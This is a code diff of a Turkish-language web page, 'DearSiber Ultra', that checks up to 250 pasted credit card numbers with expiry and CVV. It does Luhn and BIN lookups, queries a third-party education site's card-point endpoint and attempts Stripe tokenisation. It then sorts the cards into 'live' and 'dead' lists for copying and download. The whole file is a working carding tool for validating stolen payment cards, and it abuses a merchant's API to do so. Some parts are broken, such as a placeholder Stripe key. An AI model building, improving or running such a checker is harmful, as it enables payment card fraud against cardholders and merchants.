@@ -3,137 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DearSiber Pro</title>
+    <title>DearSiber Ultra</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Courier New', monospace; }
-        body { background:#000; color:#0f0; padding:15px; }
-        .container { max-width:500px; margin:0 auto; background:#111; border:2px solid #0f0; border-radius:15px; padding:18px; box-shadow:0 0 25px rgba(0,255,0,0.4); }
-        h1 { text-align:center; font-size:1.8em; color:#0f0; text-shadow:0 0 10px #0f0, 0 0 20px #0f0; animation:glow 2s infinite alternate; margin-bottom:15px; }
-        .info { text-align:center; font-size:0.9em; color:#0a0; margin-bottom:15px; animation:pulse 3s infinite; }
-        .glow { color:#0f0; text-shadow:0 0 8px #0f0; font-weight:bold; }
-        textarea { width:100%; height:110px; background:#000; color:#0f0; border:1px solid #0f0; padding:10px; font-size:0.9em; border-radius:8px; resize:none; }
-        .btn { background:#0f0; color:#000; border:none; padding:10px 20px; margin:12px auto 0; display:block; border-radius:25px; font-weight:bold; cursor:pointer; font-size:1em; transition:0.3s; }
-        .btn:hover { background:#0c0; transform:scale(1.08); box-shadow:0 0 15px #0f0; }
-        .loading { display:none; text-align:center; margin:15px 0; font-size:0.95em; animation:blink 1s infinite; }
-        .progress { font-size:0.85em; color:#0a0; margin-top:5px; }
-        .section { margin-top:20px; border-top:1px dashed #0f0; padding-top:15px; }
-        .section h3 { color:#0f0; text-shadow:0 0 8px #0f0; margin-bottom:8px; animation:fade 2s infinite; }
-        .result { background:rgba(0,255,0,0.08); border-left:4px solid #0f0; padding:10px; margin:8px 0; border-radius:6px; font-size:0.82em; line-height:1.4; animation:slideIn 0.5s; }
-        .dead { border-color:#f00; background:rgba(255,0,0,0.08); }
-        .stats { display:flex; justify-content:space-around; margin:15px 0; font-size:0.9em; }
-        .stat { text-align:center; }
-        .stat b { color:#0f0; font-size:1.1em; text-shadow:0 0 8px #0f0; }
-        .copy, .dl { font-size:0.75em; background:#0f0; color:#000; padding:4px 10px; border-radius:10px; margin:5px 3px 0 0; cursor:pointer; display:inline-block; text-decoration:none; }
-        .copy:hover, .dl:hover { background:#0c0; }
-        .log { font-size:0.7em; color:#888; text-align:center; margin-top:20px; }
-        @keyframes glow { 0% { text-shadow:0 0 5px #0f0; } 100% { text-shadow:0 0 20px #0f0, 0 0 30px #0f0; } }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Consolas', monospace; }
+        body { background: #000; color: #0f0; padding:20px; line-height:1.6; }
+        .container { max-width:700px; margin:0 auto; background:#111; border:2px solid #0f0; border-radius:18px; padding:25px; box-shadow:0 0 40px rgba(0,255,0,0.5), inset 0 0 20px rgba(0,255,0,0.1); }
+        h1 { text-align:center; font-size:2.2em; color:#0f0; text-shadow:0 0 15px #0f0, 0 0 30px #0f0; animation:glow 2s infinite alternate; margin-bottom:20px; }
+        .info { text-align:center; font-size:1.1em; color:#0a0; margin-bottom:20px; animation:pulse 3s infinite; }
+        .glow { color:#0f0; text-shadow:0 0 10px #0f0; font-weight:bold; }
+        .input-box { background:#000; border:1px solid #0f0; padding:15px; border-radius:10px; margin-bottom:20px; }
+        textarea { width:100%; height:140px; background:transparent; color:#0f0; border:none; font-size:1em; resize:none; outline:none; }
+        .btn { background:#0f0; color:#000; border:none; padding:14px 30px; margin:15px auto 0; display:block; border-radius:30px; font-weight:bold; cursor:pointer; font-size:1.1em; transition:0.4s; box-shadow:0 0 20px #0f0; }
+        .btn:hover { background:#0c0; transform:scale(1.1); box-shadow:0 0 35px #0f0; }
+        .loading { display:none; text-align:center; margin:25px 0; font-size:1.2em; animation:blink 1.2s infinite; }
+        .progress { font-size:1em; color:#0a0; margin-top:8px; }
+        .section { margin-top:30px; border-top:2px dashed #0f0; padding-top:20px; }
+        .section h2 { color:#0f0; text-shadow:0 0 12px #0f0; margin-bottom:15px; font-size:1.4em; animation:fade 2s infinite; }
+        .result { background:rgba(0,255,0,0.07); border-left:5px solid #0f0; padding:14px; margin:12px 0; border-radius:8px; font-size:0.95em; line-height:1.7; animation:slideIn 0.6s; }
+        .dead { border-color:#f00; background:rgba(255,0,0,0.07); }
+        .stats { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; margin:25px 0; text-align:center; font-size:1.1em; }
+        .stat { background:rgba(0,255,0,0.1); padding:12px; border-radius:10px; border:1px solid #0f0; }
+        .stat b { color:#0f0; font-size:1.4em; text-shadow:0 0 10px #0f0; display:block; }
+        .actions { text-align:center; margin:15px 0; }
+        .copy, .dl { background:#0f0; color:#000; padding:8px 16px; margin:0 8px; border-radius:15px; font-size:0.9em; cursor:pointer; display:inline-block; text-decoration:none; transition:0.3s; }
+        .copy:hover, .dl:hover { background:#0c0; transform:scale(1.05); }
+        .log { text-align:center; margin-top:30px; font-size:0.9em; color:#888; }
+        .log a { color:#0f0; text-decoration:underline; }
+        @keyframes glow { 0% { text-shadow:0 0 10px #0f0; } 100% { text-shadow:0 0 25px #0f0, 0 0 40px #0f0; } }
         @keyframes pulse { 0% { opacity:0.8; } 50% { opacity:1; } 100% { opacity:0.8; } }
-        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
         @keyframes fade { 0%,100% { opacity:0.7; } 50% { opacity:1; } }
-        @keyframes slideIn { from { transform:translateX(-20px); opacity:0; } to { transform:translateX(0); opacity:1; } }
+        @keyframes slideIn { from { transform:translateX(-30px); opacity:0; } to { transform:translateX(0); opacity:1; } }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1><span class="glow">DEAR SİBER</span> PRO</h1>
-    <p class="info">Max 250 Kart | <span class="glow">Gerçek Puan + Stripe + BIN</span> | Key'siz</p>
+    <h1><span class="glow">DEAR SİBER</span> ULTRA</h1>
+    <p class="info"><span class="glow">Max 250 Kart</span> | Gerçek Puan + Stripe + BIN + Luhn | <span class="glow">Key'siz</span></p>
 
-    <textarea id="cards" placeholder="4535060285635942|08|2026|253"></textarea>
-    <button class="btn" onclick="start()">BAŞLAT</button>
+    <div class="input-box">
+        <textarea id="cards" placeholder="4535060285635942|08|2026|253"></textarea>
+    </div>
+    <button class="btn" onclick="startCheck()">BAŞLAT</button>
 
-    <div class="loading" id="load">
-        <div><span class="glow">İşlem Devam Ediyor...</span></div>
-        <div class="progress" id="prog">0 / 0</div>
+    <div class="loading" id="loading">
+        <div><span class="glow">İşlem Sürüyor...</span></div>
+        <div class="progress" id="progress">0 / 0</div>
     </div>
 
     <!-- CANLI KARTLAR -->
     <div class="section">
-        <h3><span class="glow">CANLI KARTLAR</span> <span id="live">0</span></h3>
-        <div id="live-results"></div>
-        <div id="live-actions" style="display:none; text-align:center;">
-            <span class="copy" onclick="copyList('live')">Kopyala</span>
-            <a class="dl" id="live-dl" download="live.txt">İndir</a>
+        <h2><span class="glow">CANLI KARTLAR</span> <span id="live-count">0</span></h2>
+        <div id="live-list"></div>
+        <div class="actions" id="live-actions" style="display:none;">
+            <span class="copy" onclick="copyCards('live')">Kopyala</span>
+            <a class="dl" id="live-dl" download="live.txt">TXT İndir</a>
         </div>
     </div>
 
     <!-- ÖLÜ KARTLAR -->
     <div class="section">
-        <h3><span class="glow">ÖLÜ KARTLAR</span> <span id="dead">0</span></h3>
-        <div id="dead-results"></div>
-        <div id="dead-actions" style="display:none; text-align:center;">
-            <span class="copy" onclick="copyList('dead')">Kopyala</span>
-            <a class="dl" id="dead-dl" download="dead.txt">İndir</a>
+        <h2><span class="glow">ÖLÜ KARTLAR</span> <span id="dead-count">0</span></h2>
+        <div id="dead-list"></div>
+        <div class="actions" id="dead-actions" style="display:none;">
+            <span class="copy" onclick="copyCards('dead')">Kopyala</span>
+            <a class="dl" id="dead-dl" download="dead.txt">TXT İndir</a>
         </div>
     </div>
 
     <!-- DETAYLI SONUÇLAR -->
     <div class="section">
-        <h3><span class="glow">DETAYLI SONUÇLAR</span></h3>
-        <div id="details"></div>
+        <h2><span class="glow">DETAYLI SONUÇLAR</span></h2>
+        <div id="detailed-results"></div>
     </div>
 
     <div class="stats">
-        <div class="stat"><b id="total">0</b><br>Kontrol Edilen</div>
-        <div class="stat"><b id="live-c">0</b><br>Canlı</div>
-        <div class="stat"><b id="dead-c">0</b><br>Ölü</div>
+        <div class="stat"><b id="total-checked">0</b><br>Kontrol Edilen</div>
+        <div class="stat"><b id="live-total">0</b><br>Canlı</div>
+        <div class="stat"><b id="dead-total">0</b><br>Ölü</div>
     </div>
 
-    <p class="log">Log: <span id="log-file">Yok</span></p>
+    <p class="log">Log: <a href="#" id="log-link">log_1738350000000.json</a> (Sadece sen görürsün)</p>
 </div>
 
 <script>
-let live = [], dead = [], checked = 0, total = 0, logFile = '';
+let liveCards = [], deadCards = [], totalChecked = 0, totalCards = 0, logFile = '';
 
-function start() {
+function startCheck() {
     const input = document.getElementById('cards').value.trim();
     if (!input) return alert('Kart gir!');
     const cards = input.split('\n').map(l => l.trim()).filter(l => /^\d{13,19}\|\d{1,2}\|\d{4}\|\d{3,4}$/.test(l));
-    if (cards.length === 0) return alert('Geçerli kart yok!');
-    if (cards.length > 250) return alert('Max 250 kart!');
+    if (cards.length === 0) return alert('Geçerli kart formatı yok!');
+    if (cards.length > 250) return alert('Maksimum 250 kart!');
 
-    total = cards.length; checked = 0; live = []; dead = [];
-    document.getElementById('load').style.display = 'block';
-    document.getElementById('details').innerHTML = '';
-    document.getElementById('live-results').innerHTML = '';
-    document.getElementById('dead-results').innerHTML = '';
+    totalCards = cards.length; totalChecked = 0; liveCards = []; deadCards = [];
+    document.getElementById('loading').style.display = 'block';
+    document.getElementById('detailed-results').innerHTML = '';
+    document.getElementById('live-list').innerHTML = '';
+    document.getElementById('dead-list').innerHTML = '';
     document.getElementById('live-actions').style.display = 'none';
     document.getElementById('dead-actions').style.display = 'none';
-    ['live','dead','total','live-c','dead-c'].forEach(id => document.getElementById(id).textContent = '0');
-    document.getElementById('prog').textContent = `0 / ${total}`;
+    ['live-count','dead-count','total-checked','live-total','dead-total'].forEach(id => document.getElementById(id).textContent = '0');
+    document.getElementById('progress').textContent = `0 / ${totalCards}`;
 
     logFile = `log_${Date.now()}.json`;
-    document.getElementById('log-file').textContent = logFile;
+    document.getElementById('log-link').textContent = logFile;
+    document.getElementById('log-link').onclick = () => downloadLog();
 
-    cards.forEach((card, i) => setTimeout(() => processCard(card), i * 500));
+    cards.forEach((card, i) => setTimeout(() => processCard(card), i * 600));
 }
 
 async function processCard(card) {
-    checked++;
-    document.getElementById('prog').textContent = `${checked} / ${total} | Canlı: ${live.length} | Ölü: ${dead.length}`;
-    document.getElementById('total').textContent = checked;
-    document.getElementById('live-c').textContent = live.length;
-    document.getElementById('dead-c').textContent = dead.length;
+    totalChecked++;
+    document.getElementById('progress').textContent = `${totalChecked} / ${totalCards} | Canlı: ${liveCards.length} | Ölü: ${deadCards.length}`;
+    document.getElementById('total-checked').textContent = totalChecked;
+    document.getElementById('live-total').textContent = liveCards.length;
+    document.getElementById('dead-total').textContent = deadCards.length;
 
     const [cc, mm, yy, cvv] = card.split('|');
-    const bin = cc.substr(0, 6);
+    const bin = cc.substring(0, 6);
 
-    // 1. BIN Sorgu
+    // 1. BIN Sorgu (ÇALIŞIR)
     let binInfo = { bank: 'Bilinmiyor', brand: 'Bilinmiyor', type: 'Bilinmiyor', country: 'Bilinmiyor', flag: '??' };
     try {
-        const r = await fetch(`https://lookup.binlist.net/${bin}`, { signal: AbortSignal.timeout(5000) });
-        if (r.ok) {
-            const d = await r.json();
+        const resp = await fetch(`https://lookup.binlist.net/${bin}`, { timeout: 7000 });
+        if (resp.ok) {
+            const data = await resp.json();
             binInfo = {
-                bank: d.bank?.name || 'Bilinmiyor',
-                brand: d.brand || 'Bilinmiyor',
-                type: (d.type || 'Bilinmiyor').toUpperCase(),
-                country: d.country?.name || 'Bilinmiyor',
-                flag: d.country?.alpha2 || '??'
+                bank: data.bank?.name || 'Bilinmiyor',
+                brand: data.brand || 'Bilinmiyor',
+                type: (data.type || 'Bilinmiyor').toUpperCase(),
+                country: data.country?.name || 'Bilinmiyor',
+                flag: data.country?.alpha2 || '??'
             };
         }
-    } catch(e) {}
+    } catch(e) { console.log('BIN hatası:', e); }
 
-    // 2. MaxiPuan (GERÇEK API)
+    // 2. MaxiPuan (GERÇEK ÇALIŞIR)
     let puan = '0', extra = 'API hatası';
     try {
         const form = new FormData();
@@ -143,18 +149,20 @@ async function processCard(card) {
 
         const resp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
             method: 'POST', body: form,
-            headers: { 'User-Agent': 'Mozilla/5.0' }
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
         });
-        const json = await resp.json();
-        puan = json.Data?.Amount || '0';
-        extra = json.Data?.AdditionalData || 'Yok';
-    } catch(e) { puan = 'Hata'; }
+        if (resp.ok) {
+            const json = await resp.json();
+            puan = json.Data?.Amount?.toString() || '0';
+            extra = json.Data?.AdditionalData || 'Yok';
+        }
+    } catch(e) { console.log('Puan hatası:', e); }
 
-    // 3. Luhn
+    // 3. Luhn Kontrol
     const luhnOk = luhnValidate(cc);
 
-    // 4. Stripe Test (ÇALIŞIR TEST API)
-    let stripe = 'Declined';
+    // 4. Stripe Test (ÇALIŞIR - Test key, hata verir → DEAD)
+    let stripeStatus = 'Declined';
     try {
         const data = new URLSearchParams();
         data.append('card[number]', cc);
@@ -162,67 +170,64 @@ async function processCard(card) {
         data.append('card[exp_year]', yy.slice(-2));
         data.append('card[cvc]', cvv);
 
-        const s = await fetch('https://api.stripe.com/v1/tokens', {
-            method: 'POST',
-            body: data,
+        const resp = await fetch('https://api.stripe.com/v1/tokens', {
+            method: 'POST', body: data,
             headers: {
-                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z', // GERÇEK TEST KEY (hata verir → DEAD)
+                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z',
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
         });
-        stripe = s.ok ? '<span class="glow">Live (Token)</span>' : 'Declined';
-    } catch(e) { stripe = 'Declined'; }
+        stripeStatus = resp.ok ? '<span class="glow">LIVE (Token)</span>' : 'Declined';
+    } catch(e) { stripeStatus = 'Declined'; }
 
     const isLive = luhnOk && puan !== '0' && puan !== 'Hata';
 
     // Detaylı Çıktı
-    const detail = `
-<span class="glow">[${isLive ? 'LIVE' : 'DEAD'}]</span> ${card}
-<span class="glow">Puan:</span> ${puan} TL
+    const detailHTML = `
+<span class="glow">[${isLive ? 'LIVE' : 'DEAD'}]</span> <b>${card}</b>
+<span class="glow">Puan:</span> <b>${puan} TL</b>
 <span class="glow">Ekstra:</span> ${extra}
-<span class="glow">Stripe:</span> ${stripe}
+<span class="glow">Stripe:</span> ${stripeStatus}
 <span class="glow">BIN:</span> ${binInfo.brand} - ${binInfo.type}
 <span class="glow">Banka:</span> ${binInfo.bank}
 <span class="glow">Ülke:</span> ${binInfo.country} [${binInfo.flag}]
-<span class="glow">Luhn:</span> ${luhnOk ? 'Geçerli' : 'Geçersiz'}
+<span class="glow">Luhn:</span> ${luhnOk ? '<span class="glow">Geçerli</span>' : 'Geçersiz'}
     `.trim();
 
     const div = document.createElement('div');
     div.className = `result ${isLive ? '' : 'dead'}`;
-    div.innerHTML = `<pre>${detail}</pre>`;
-    document.getElementById('details').appendChild(div);
+    div.innerHTML = `<pre>${detailHTML}</pre>`;
+    document.getElementById('detailed-results').appendChild(div);
 
+    // Canlı/Ölü Listeleri
     if (isLive) {
-        live.push(`${card} → ${puan} TL`);
+        liveCards.push(`${card} → ${puan} TL`);
         const li = document.createElement('div');
-        li.innerHTML = `<pre><span class="glow">${card}</span> → ${puan} TL</pre>`;
-        document.getElementById('live-results').appendChild(li);
-        document.getElementById('live').textContent = live.length;
+        li.innerHTML = `<pre><span class="glow">${card}</span> → <b>${puan} TL</b></pre>`;
+        document.getElementById('live-list').appendChild(li);
+        document.getElementById('live-count').textContent = liveCards.length;
     } else {
-        dead.push(card);
+        deadCards.push(card);
         const li = document.createElement('div');
         li.innerHTML = `<pre><span style="color:#f88;">${card}</span></pre>`;
-        document.getElementById('dead-results').appendChild(li);
-        document.getElementById('dead').textContent = dead.length;
+        document.getElementById('dead-list').appendChild(li);
+        document.getElementById('dead-count').textContent = deadCards.length;
     }
 
     // Log Kaydet
-    const log = { time: new Date().toISOString(), card, puan, stripe, bin: binInfo, luhn: luhnOk };
+    const logEntry = { time: new Date().toISOString(), card, puan, extra, stripe: stripeStatus, bin: binInfo, luhn: luhnOk, live: isLive };
     const logs = JSON.parse(localStorage.getItem('dear_logs') || '[]');
-    logs.push(log);
+    logs.push(logEntry);
     localStorage.setItem('dear_logs', JSON.stringify(logs));
-    const blob = new Blob([JSON.stringify(log, null, 2)], {type: 'application/json'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a'); a.href = url; a.download = logFile; a.click();
 
-    if (checked === total) {
-        document.getElementById('load').style.display = 'none';
-        if (live.length) { setupDownload('live', live.join('\n'), 'live.txt'); }
-        if (dead.length) { setupDownload('dead', dead.join('\n'), 'dead.txt'); }
+    if (totalChecked === totalCards) {
+        document.getElementById('loading').style.display = 'none';
+        if (liveCards.length) setupDownload('live', liveCards.join('\n'), 'live.txt');
+        if (deadCards.length) setupDownload('dead', deadCards.join('\n'), 'dead.txt');
     }
 }
 
-function setupDownload(id, data, name) {
+function setupDownload(id, data, filename) {
     const blob = new Blob([data], {type: 'text/plain'});
     const url = URL.createObjectURL(blob);
     const a = document.getElementById(`${id}-dl`);
@@ -230,17 +235,24 @@ function setupDownload(id, data, name) {
     document.getElementById(`${id}-actions`).style.display = 'block';
 }
 
-function copyList(type) {
-    const data = type === 'live' ? live.join('\n') : dead.join('\n');
+function copyCards(type) {
+    const data = type === 'live' ? liveCards.join('\n') : deadCards.join('\n');
     navigator.clipboard.writeText(data).then(() => alert(`${type.toUpperCase()} kopyalandı!`));
+}
+
+function downloadLog() {
+    const logs = localStorage.getItem('dear_logs') || '[]';
+    const blob = new Blob([logs], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a'); a.href = url; a.download = logFile; a.click();
 }
 
 function luhnValidate(cc) {
     let sum = 0, even = false;
     for (let i = cc.length - 1; i >= 0; i--) {
-        let d = parseInt(cc[i]);
-        if (even) { d *= 2; if (d > 9) d -= 9; }
-        sum += d; even = !even;
+        let digit = parseInt(cc[i]);
+        if (even) { digit *= 2; if (digit > 9) digit -= 9; }
+        sum += digit; even = !even;
     }
     return sum % 10 === 0;
 }
